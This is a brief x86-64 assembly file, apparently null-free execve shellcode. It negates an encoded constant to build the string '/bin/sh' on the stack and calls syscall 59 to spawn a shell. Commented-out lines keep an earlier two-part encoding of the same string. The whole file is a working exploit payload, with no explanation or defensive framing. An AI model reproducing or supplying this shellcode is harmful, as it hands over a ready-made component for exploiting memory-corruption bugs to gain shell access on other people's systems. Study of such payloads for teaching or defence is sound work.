section .text
  global _start
    _start:
      push rax
      xor rdx, rdx
      xor rsi, rsi
      ;mov rax, 0x978cd0d1
      ;mov rax, 0x68732f2f
      ;neg eax
      ;push rax
      ;mov rax, 0x91969dd1
      ;mov rax, 0x6e69622f
      ;neg eax
      ;push rax
      mov rax, 0xFF978CD091969DD1
      neg rax
      push rax
      xor rax, rax
      push rsp
      pop rdi
      mov al, 59
      syscall
